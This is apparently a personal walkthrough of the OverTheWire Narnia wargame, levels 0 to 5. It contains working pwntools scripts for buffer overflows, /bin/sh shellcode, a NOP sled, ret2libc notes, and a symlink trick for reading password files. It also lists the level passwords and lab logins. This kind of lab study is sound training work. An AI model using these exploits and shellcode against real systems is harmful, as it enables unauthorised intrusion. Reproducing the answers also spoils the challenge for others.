
`ssh narniax@narnia.labs.overthewire.org -p 2226`

`scp -P 2226 narniax@narnia.labs.overthewire.org:/narnia/narniax .`
`scp -P 2226 narniax@narnia.labs.overthewire.org:/narnia/narniax.c .`

very useful resource to write shit in pwntools
https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html

## narnia0 : narnia0 

So, the first challenge is a basic bufferoverflow attack. As, I didn't want to solve it in the conventional way (using `echo` or `python -c print`), I took this as a chance to get used to the commands in gdb (peda), and make a script in pwntools.


Learning to ssh with pwntools and running a binary as a process. I first downloaded the files and ran the exploit locally, then added the ssh part later.
I am deffo gonna be writing all my exploits in pwntools, as it's more naturally to me to write exploits in python than using bash commands.


Here's my exploit 
```python
from pwn import *

shell = ssh('narnia0', 'narnia.labs.overthewire.org', password='narnia0', port=2226)

  

context.update(arch='i386', os='linux')

  

# create a process

p = shell.process("/narnia/narnia0")

  

print(p.recvline())

  

a = b"aaaabaaacaaadaaaeaaa\xef\xbe\xad\xde"

  

p.sendline(a)

  

print(p.recvline())

print(p.recvline())

p.interactive()
```

## narnia1 : efeidiedae

So, we need a persitent ENV variable which gets executed.

We need a shell code, but how do we have a env variable that is presistent. 

First, we copy `.bashrc` and to a temporary folder, add one line that is the enviromental variable, this variable should be persistent :D 

oh and make sure to `source ` the file

okay, now that we can have a variable that will be executed, let's now craft our shellcode, I discovered that pwntools does this for you easily (pwntools is just op)

```python
from pwn import *
print(asm(shellcraft.linux.sh()))
```

run the script, copy the bytes to the enviromental variable, should look something like 

```bash
export EGG = $'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

This creates a function in assembly that will syscall to give us shell :triumph:

I spent a bit of time trying to ret2libc, but this was the wrong way craft a shell code, the solution I figured out was was much easier than this. I dont want to waste all that research, so here's stuff i learnt

#### retlibc attempt research

Let's find the address of system 

https://security.stackexchange.com/questions/195246/how-to-find-address-of-system-in-an-executable-rop-exploit

address of system : `0xf7e4c850`

Let's find the address of /bin/sh
https://stackoverflow.com/questions/49684686/buffer-overflow-to-bin-sh

```bash
find &system,+9999999,"/bin/sh"
```

address of sh: `0xf7f6ecc8`

way to create ret2libc exploits 
`&system | 00 | &bin/sh`
https://tripoloski1337.github.io/ctf/2020/01/26/return-to-libc-attack.html
^ writeup that helped.


## narnia2 : nairiepecu
Looking at the code, I have a feeling that it might be overwriting the EIP and making it call our shell code function that we injected.

Inspecting in gdb, we see that
```
r $(cyclic 136)
cyclic -l "iaab"
```

The eip is overwritten after 132 bytes in the  buffer, the last 4 bytes overwrites EIP.

Perhaps, we can inject our shellcode here? Let's try

This was a straightforward chall but I didn't understand why jumping directly to shellcode usually doesnt work, and that you need NOP instructions to pad the EIP so we dont miss the exact bytecode where the shellcode would be executed.

Another important thing is reading what's in the stack, and jumping in the middle of the NOP operation, this is known as NOPsled, also your local exploit address and machine address will be different so be sure to get the exact memory address in the narnia machine's gdb :)

```bash
x/300wx $sp
```

```python
from pwn import *

add = # get it from gdb


b = "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80"

b = bytes.fromhex(b)

a = b"\x90"*(132-len(b))

a +=b

  

a += p32(add)

print(a)

f = open("bruh","wb")

f.write(a)

f.close()

```

## narnia3 : vaequeezee

Was lucky that my first idea worked :D 

We dont give a file name, we give string

read from =`etc/narnia_pass/narnia3` through symlink

`cat /etc/narnia_pass/narnia4'
now overflow until we overwrite `/dev/null` with our filename


sym link to readfrom

write to `/tmp/maey/b`

`/tmp/maey/A* n +"/" + tmp/maey/b`  - symlink

I did a lazy and made all these files in a seperate instance of ssh, so i can run the scripts
it looks like a pain making files in pwntools ssh instance

```bash
mkdir /tmp/maey
cd /tmp/maey
touch b
chmod -R 777 .
mkdir AAAAAAAAAAAAAAAAAAAAAA
cd AAAAAAAAAAAAAAAAAAAAAA
mkdir tmp
cd tmp
mkdir maey
ln -s /etc/narnia_pass/narnia4 b
chmod -R 777 .
```

```python
from pwn import *

shell = ssh('narnia3', 'narnia.labs.overthewire.org', password='vaequeezee', port=2226)

  

context.update(arch='i386', os='linux')

file2 = b"tmp/maey/b"

  

file1 = b"/tmp/maey/"

file1 += b"A"*(32-len(file1))+b"/"

file1 +=file2

print(file1)

p = shell.process([b"/narnia/narnia3",file1])

print(p.recvline())
```

Flag should be written to `/tmp/maey/b` :)

this was a cool challenge that makes you apply what you learn in the previous challs :D


## narnia4 : thaenohtai

Essentially narnia2??? the enviromental variables are set to Null so, we cant use narnia1, but i guess i used the harder solution earlier?? lol
https://man7.org/linux/man-pages/man7/environ.7.html

## narnia5 :  faimahchiy
Very cool easy challenge about overwriting an address in format string, 


## narnia6 : neezocaeng



## narnia7 : 


## narnia8 : 


## narnia9 : 





